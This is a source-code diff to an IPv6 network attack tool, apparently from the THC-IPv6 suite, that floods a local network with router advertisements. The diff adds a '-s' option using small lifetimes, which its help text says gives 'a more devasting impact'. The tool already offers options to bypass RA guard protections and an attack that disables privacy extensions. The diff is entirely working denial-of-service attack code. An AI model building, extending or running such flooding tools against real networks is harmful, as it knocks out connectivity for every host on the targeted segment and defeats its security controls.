@@ -13,14 +13,15 @@
 #define ENTRIES 17
 
 void help(char *prg) {
-  printf("%s %s (c) 2012 by %s %s\n\n", prg, VERSION, AUTHOR, RESOURCE);
-  printf("Syntax: %s [-HFDRP] interface\n\n", prg);
+  printf("%s %s (c) 2013 by %s %s\n\n", prg, VERSION, AUTHOR, RESOURCE);
+  printf("Syntax: %s [-HFD] [-s] [-RPA] interface\n\n", prg);
   printf("Flood the local network with router advertisements.\n");
   printf("Each packet contains %d prefix and route enries\n", ENTRIES);
   printf("-F/-D/-H add fragment/destination/hopbyhop header to bypass RA guard security.\n");
   printf("-R does only send routing entries, no prefix information.\n");
   printf("-P does only send prefix information, no routing entries.\n");
   printf("-A is like -P but implements an attack by George Kargiotakis to disable privacy extensions\n");
+  printf("The option -s uses small lifetimes, resulting in a more devasting impact\n");
 //  printf("Use -r to use raw mode.\n\n");
   exit(-1);
 }
@@ -33,17 +34,20 @@ int main(int argc, char *argv[]) {
   int size, mtu, i, j, k, type = NXT_ICMP6, route_only = 0, prefix_only = 0, offset = 14;
   unsigned char *pkt = NULL;
   int pkt_len = 0, rawmode = 0, count = 0, deanon = 0, do_hop = 0, do_frag = 0, do_dst = 0;
-  int cnt = ENTRIES, until = 0;
+  int cnt = ENTRIES, until = 0, lifetime = 0x00ff0100, mfoo;
   thc_ipv6_hdr *hdr = NULL;
 
   if (argc < 2 || strncmp(argv[1], "-h", 2) == 0)
     help(argv[0]);
 
-  while ((i = getopt(argc, argv, "DFHRPAr")) >= 0) {
+  while ((i = getopt(argc, argv, "DFHRPArs")) >= 0) {
     switch (i) {
     case 'r':
       thc_ipv6_rawmode(1);
       rawmode = 1;
+      break;
+    case 's':
+      lifetime = 0x03000000;
       break;
     case 'A':
       deanon = 1;
@@ -117,8 +121,10 @@ int main(int argc, char *argv[]) {
       buf[j+1] = 4;
       buf[j+2] = size;
       buf[j+3] = 128 + 64 + 32;
-      buf[j+5] = 2;
-      buf[j+9] = 1;
+      memcpy(buf + j + 4, (char*) &lifetime, 4);
+      memcpy(buf + j + 8, (char*) &lifetime, 4);
+//      buf[j+5] = 2;
+//      buf[j+9] = 1;
 //      memset(&buf[j+16], 255, 8);
       if (deanon) {
         buf[j+16] = 0xfd;
@@ -139,7 +145,8 @@ int main(int argc, char *argv[]) {
       buf[j+1] = 3;
       buf[j+2] = size;
       buf[j+3] = 8;
-      buf[j+5] = 1; // 4-7 lifetime
+      memcpy(buf + j + 4, (char*)&lifetime, 4);
+//      buf[j+5] = 1; // 4-7 lifetime
 //      memset(&buf[j+8], 255, 8);
       buf[j+8] = 32;
       buf[j+9] = 4;
@@ -187,7 +194,11 @@ int main(int argc, char *argv[]) {
       if (thc_add_hdr_dst(pkt, &pkt_len, buf3, sizeof(buf3)) < 0)
         return -1;
     }
-    if (thc_add_icmp6(pkt, &pkt_len, ICMP6_ROUTERADV, 0, 0xff08ffff, buf, j, 0) < 0)
+    if (lifetime != 0x03000000)
+      mfoo = 0xff08ffff;
+    else
+      mfoo = 0xff080003;
+    if (thc_add_icmp6(pkt, &pkt_len, ICMP6_ROUTERADV, 0, mfoo, buf, j, 0) < 0)
       return -1;
     if (do_dst) {
       thc_generate_pkt(interface, mac6, dstmac, pkt, &pkt_len);
